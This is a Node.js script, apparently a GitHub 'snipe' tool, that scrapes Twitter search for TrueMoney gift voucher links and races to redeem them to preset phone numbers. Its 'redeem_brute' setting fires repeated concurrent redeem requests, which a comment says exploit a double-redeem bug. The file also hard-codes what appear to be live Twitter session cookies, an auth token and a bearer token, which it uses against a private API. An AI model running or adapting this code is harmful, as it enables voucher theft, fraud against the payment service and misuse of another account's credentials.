process.env['NODE_ENV'] = 'production'
process.setMaxListeners(Infinity)


global.config = {
    phones: [
        '080xxxxxxx'
    ],
    twitter_polling_interval : 15,
    redeem_brute: 5 // true gift double redeem bug
}

import fetch from 'node-fetch'
import chalk from 'chalk'

import https from 'https'

console.log(`หมายศาล snipe @github.com/chanios`)

const httpsAgent = new https.Agent({ keepAlive: true });
const agent = new https.Agent({ keepAlive: true });

const _m = new Set()
const _o = new Set()

const voucher_regex = /(?<=gift.truemoney.com\/campaign\/\?v=)[A-z0-9]+/gi;
const bitly_regex = /(?<=bit.ly\/)[A-z0-9]+/i;

let redeem = async (e = "", t = "") => {
    if (!(e = (e + "").trim()).length || e.match(/\D/)) throw Error("INVAILD_PHONE");
    let r = (t += "").split("v=");
    if (18 != (t = (r[1] || r[0]).match(/[0-9A-Za-z]+/)[0]).length) throw Error("INVAILD_VOUCHER");
    let o = await fetch(`https://gift.truemoney.com/campaign/vouchers/${t}/redeem`, {
        method: 'POST',
        headers: {
            'content-type': 'application/json'
        },
        body: JSON.stringify({
            mobile: e,
            voucher_hash: t
        }),
        agent: agent
    }).then(res=>res.json());
    return o
};
var amount_baht = 0;
(async()=>{
    async function _r(link,phone) {
        let res;
        while (!_o.has(link)) {
            res = await redeem(phone,link).catch(e=>'b');
            if(res){
                if(res == 'b') break
                if(res.status.code == 'SUCCESS') {
                    process.title = 'baht: '+(amount_baht+= parseFloat( res.data.my_ticket.amount_baht))
                    console.log(chalk.greenBright(res.status.code,phone,res.data.my_ticket.amount_baht) )
                    break
                }
                console.log(res.status.code, phone)
                if(res.status.code == 'INTERNAL_ERROR' || res.status.code == 'TARGET_USER_REDEEMED') break
                if(res.status.code == 'RESERVED_TICKET') { // server is processing try to start new request as fast as possible
                    continue
                }
                if(res.status.code == 'VOUCHER_OUT_OF_STOCK') {
                    _o.add(link)
                    break
                }
            }
        }
    }
    async function checkvoucher(link) {
        if(!_m.has(link)){
            _m.add(link)
            console.log('new voucher ' +link)
            let i = global.config.redeem_brute;
            while (i--) { // loop try to bug da truemoney :)
                let p = global.config.phones.length
                while (p--) {
                    _r(link,global.config.phones[p])
                }
            }
        }
    }
    let check = async() => {
        try {
            const data_raw = await fetch("https://twitter.com/i/api/2/search/adaptive.json?include_profile_interstitial_type=1&include_blocking=1&include_blocked_by=1&include_followed_by=1&include_want_retweets=1&include_mute_edge=1&include_can_dm=1&include_can_media_tag=1&include_ext_has_nft_avatar=1&skip_status=1&cards_platform=Web-12&include_cards=1&include_ext_alt_text=true&include_quote_count=true&include_reply_count=1&tweet_mode=extended&include_entities=true&include_user_entities=true&include_ext_media_color=true&include_ext_media_availability=true&include_ext_sensitive_media_warning=true&send_error_codes=true&simple_quoted_tweet=true&q=gift.truemoney.com&tweet_search_mode=live&count=1&query_source=typed_query&pc=1&spelling_corrections=1&ext=mediaStats%2ChighlightedLabel%2ChasNftAvatar%2CvoiceInfo%2CsuperFollowMetadata", {
                "headers": {
                    "authorization": "Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA",
                    "x-csrf-token": "ad762e4a2aefd1f393131715fc886c3c9e49a7fae5a60d085ed568a64918b09e077e08d0a5572a30d3d8b10a393cd4b0af3fc786ef06a33d134640a2b422ac8401b5178865fd95fe02087ce2e0f0ea38",
                    "cookie": "guest_id_marketing=v1%3A163915565719666104; guest_id_ads=v1%3A163915565719666104; personalization_id=\"v1_hIB70WFLZxWXtCMWl/ee6g==\"; guest_id=v1%3A163915565719666104; at_check=true; _gid=GA1.2.191706185.1643643054; des_opt_in=Y; _gcl_au=1.1.653151281.1643643062; gt=1488173081546100739; external_referer=padhuUp37zjgzgv1mFWxJ12Ozwit7owX|0|8e8t2xd8A2w%3D; _sl=1; _twitter_sess=BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCPk9w7B%252BAToMY3NyZl9p%250AZCIlNTVlN2I3NTg0NTRkYTM3N2RiZGRlYWIwYjRjYmU5OGI6B2lkIiUwMDQ3%250AODNkNDhiMDUzMTBmMDgwNGIwYTAwYjQ1NDUwMw%253D%253D--48a8812cb0bc5a5c177784a62dcff3f9cc4f7127; kdt=VTVKTtqBJDTagb3ThwJXQA6l1B5g7i6DZom8lrne; auth_token=84cfdcd6ef169a72065219b1a5edaf671ea9e36d; ct0=ad762e4a2aefd1f393131715fc886c3c9e49a7fae5a60d085ed568a64918b09e077e08d0a5572a30d3d8b10a393cd4b0af3fc786ef06a33d134640a2b422ac8401b5178865fd95fe02087ce2e0f0ea38; twid=u%3D1403438381250404352; att=1-Ztk5V3b2ToaIGZm5y90LlPW1IVvJ45jEGm70DQSt; lang=en; mbox=session#a5770d01972446abbbdc4a470e200a4c#1643647799|PC#a5770d01972446abbbdc4a470e200a4c.38_0#1706890739; _ga_34PHSZMC42=GS1.1.1643643054.1.1.1643645957.0; _ga=GA1.2.1052533855.1642778729",
                },
                agent: httpsAgent
            }).then(res=>res.json())
            for(const data in data_raw.globalObjects.tweets){
                let i = data_raw.globalObjects.tweets[data].entities.urls.length
                while (i--) {
                    let url = data_raw.globalObjects.tweets[data].entities.urls[i].expanded_url
                    let matched = url.match(voucher_regex)
                    if(matched) {
                        let _u = matched.length
                        while (_u--) checkvoucher(matched[_u])
                    }
                    let bitly_matched = url.match(bitly_regex)
                    if(bitly_matched){
                        let _b = bitly_matched.length
                        while (_b--) {
                            fetch('https://bit.ly/'+bitly_matched[_b],{
                                redirect: 'manual'
                            })
                            .then(res=>res.headers.get('location'))
                            .then(url=>{
                                let v = url.match(voucher_regex)
                                if(v) checkvoucher(v[0])
                            })
                        }
                    }
                }
            }
        } catch (error) {
            console.error(error)
        }
    }
    setInterval(check, global.config.twitter_polling_interval);
}
)();